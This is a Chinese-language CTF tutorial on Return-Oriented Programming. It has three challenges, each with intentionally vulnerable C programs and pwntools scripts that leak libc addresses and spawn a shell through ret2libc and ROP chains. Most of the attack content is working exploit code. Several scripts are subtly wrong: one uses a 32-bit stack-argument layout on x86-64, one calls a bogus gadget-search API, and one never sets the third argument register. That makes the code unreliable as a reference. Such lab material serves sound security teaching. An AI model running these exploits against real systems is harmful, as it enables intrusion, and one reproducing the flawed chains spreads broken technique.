CTF-Pwn ROP 实战

学习Return-Oriented Programming，绕过DEP防护。

ROP (Return-Oriented Programming) 原理

为什么需要ROP？

现代系统有DEP/NX防护，栈上代码不可执行。ROP通过拼接已有代码片段(gadgets)来构建攻击。

什么是Gadget？

程序中以 ret 结尾的短指令序列。通常是 pop xxx; ret 或 mov xxx; ret。

challenge1 - ret2libc 基础

入门

源码 (rop1.c)

#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buf[64];
    gets(buf);
}

int main() {
    printf("ROP Challenge 1 - ret2libc\n");
    vuln();
    return 0;
}
漏洞分析
  • 漏洞点：gets(buf) 栈溢出
  • 利用方法：返回到libc中的system函数
  • 关键：64位系统调用约定：rdi = 第1个参数
  • 需泄露：libc基地址（通过write或printf）

编译命令

gcc -no-pie -fno-stack-protector -z execstack -o rop1 rop1.c
注意：保留puts/write函数用于泄露libc地址

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

# 本地进程
p = process('./rop1')
elf = ELF('./rop1')

# ========== 第一步：泄露 libc 地址 ==========
# 获取puts在got中的地址
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
print(f"puts @ PLT: {hex(puts_plt)}, GOT: {hex(puts_got)}")

# 返回地址填充到vuln函数之后
# 由于没有libc，我们需要先泄露
# 构造ROP链：返回地址指向puts_plt，执行完后返回到main继续利用
vuln_addr = elf.symbols['vuln']

payload = b'A' * 72                                    # 填充
payload += p64(puts_plt)                               # 调用puts
payload += p64(vuln_addr)                             # 返回到vuln继续溢出
payload += p64(puts_got)                               # puts的参数 = puts@got = 实际puts地址

p.sendline(payload)
p.recvuntil("ROP Challenge 1 - ret2libc\n")           # 跳过输出

# 接收泄露的puts地址
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"Leaked puts address: {hex(leaked_puts)}")

# ========== 第二步：计算 system 和 /bin/sh ==========
# 假设ASLR偏移固定（新手题目通常如此）
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')         # 加载libc
libc.address = leaked_puts - libc.symbols['puts']      # 计算libc基地址

system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
print(f"system: {hex(system_addr)}, /bin/sh: {hex(bin_sh)}")

# ========== 第三步：getshell ==========
payload = b'A' * 72
payload += p64(system_addr)                            # 调用system
payload += p64(0xdeadbeef)                            # 返回地址（无所谓）
payload += p64(bin_sh)                                 # 参数: /bin/sh

p.sendline(payload)
p.interactive()
脚本解释
  • elf.got['puts'] - 从ELF获取puts的GOT地址
  • elf.plt['puts'] - puts的PLT地址（跳转到这里执行）
  • u64(p.recvline()...) - 解析泄露的64位地址
  • libc.address = leaked - libc.symbols['puts'] - 计算libc基地址
  • ROP链结构：[填充][函数地址][返回地址][参数]

challenge2 - ROPgadget 搜索

进阶

源码 (rop2.c)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf[32];

void win() {
    system("/bin/sh");
}

void vuln() {
    memset(buf, 0, sizeof(buf));
    gets(buf);
}

int main() {
    printf("ROP Challenge 2 - Find gadgets!\n");
    printf("buf at: %p\n", buf);
    vuln();
    return 0;
}
漏洞分析
  • 利用方法：直接返回到win()函数
  • 难度：需要使用ROPgadget搜索 pop rdi; ret
  • 搜索命令：ROPgadget --binary rop2 | grep pop

编译命令

gcc -no-pie -fno-stack-protector -o rop2 rop2.c
注意：不加-z execstack，因为我们要用ROP而非栈执行

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./rop2')
elf = ELF('./rop2')

# 查找gadgets
print("[*] Finding gadgets...")
from ropgadget import ROPGadget
rop = ROPGadget('./rop2')
gadgets = rop.gadgets()

# 找 pop rdi; ret
pop_rdi = None
for gadget in gadgets:
    if gadget.values()[0].startswith('pop rdi'):
        pop_rdi = gadget.values()[0].split()[0]
        break

if not pop_rdi:
    # 或者手动搜索
    pop_rdi = 0x401223  # 通过ROPgadget手动找到的地址

win_addr = elf.symbols['win']
print(f"win @ {hex(win_addr)}")
print(f"pop rdi; ret @ {hex(pop_rdi)}")

# 构造ROP链
# pop rdi; ret 会把栈顶的值弹出到rdi（第一个参数）
# 然后ret跳转到下一条指令（win）
payload = b'A' * 40
payload += p64(pop_rdi)           # pop rdi
payload += p64(0xdeadbeef)       # 这个值会被pop到rdi（无用，但满足ret需要）
payload += p64(win_addr)         # 返回到win()

p.sendline(payload)
p.interactive()
手动搜索gadgets
ROPgadget --binary rop2 --only "pop|ret"
objdump -d rop2 | grep -A2 "pop\|ret"
readelf -s rop2 | grep FUNC

challenge3 - 构建完整ROP链

高阶

源码 (rop3.c)

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[64];
    read(0, buf, 128);  // 可以读入更多数据
}

int main() {
    printf("ROP Challenge 3 - Build ROP chain!\n");
    printf("GOT table:\n");
    printf("puts:   %p\n", (void*)&printf);
    printf("write: %p\n", (void*)&write);
    vuln();
    return 0;
}
漏洞分析
  • 利用方法：完整的ROP链调用system("/bin/sh")
  • 关键gadgets：pop rdi; ret, pop rsi; pop r15; ret
  • 思路：泄露write地址 → 计算libc → 调用system("/bin/sh")

编译命令

gcc -no-pie -fno-stack-protector -o rop3 rop3.c

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./rop3')
elf = ELF('./rop3')

# ========== 第一步：泄露 libc ==========
# 从输出中解析write的GOT地址
p.recvuntil("write: ")
write_got = int(p.recvline().strip(), 16)
print(f"write @ GOT: {hex(write_got)}")

# ROP gadgets
POP_RDI = 0x401223      # pop rdi; ret
POP_RSI_R15 = 0x401221  # pop rsi; pop r15; ret
RET = 0x401224          # ret (用于栈对齐)

# write(1, write_got, 8) - 输出write在内存中的地址
payload = b'A' * 72
payload += p64(POP_RDI)          # 设置第一个参数
payload += p64(1)                # fd = 1 (stdout)
payload += p64(POP_RSI_R15)     # 设置第二个参数
payload += p64(write_got)        # buf = write_got地址
payload += p64(8)                # count = 8字节
payload += p64(elf.plt['write']) # 调用write打印地址
payload += p64(elf.symbols['main']) # 返回main继续利用

p.sendline(payload)

# 解析泄露的write地址
write_leaked = u64(p.recv(8))
print(f"Leaked write: {hex(write_leaked)}")

# ========== 第二步：计算libc ==========
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = write_leaked - libc.symbols['write']
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
print(f"system: {hex(system_addr)}, bin_sh: {hex(bin_sh)}")

# ========== 第三步：调用 system("/bin/sh") ==========
payload = b'A' * 72
payload += p64(RET)              # 栈对齐（有时候需要）
payload += p64(POP_RDI)
payload += p64(bin_sh)          # rdi = "/bin/sh"
payload += p64(system_addr)      # 调用system("/bin/sh")

p.sendline(payload)
p.interactive()
64位函数调用约定 (System V AMD64 ABI)
  • RDI - 第1个参数
  • RSI - 第2个参数
  • RDX - 第3个参数
  • RCX - 第4个参数
  • R8 - 第5个参数
  • R9 - 第6个参数
  • RAX - 返回值
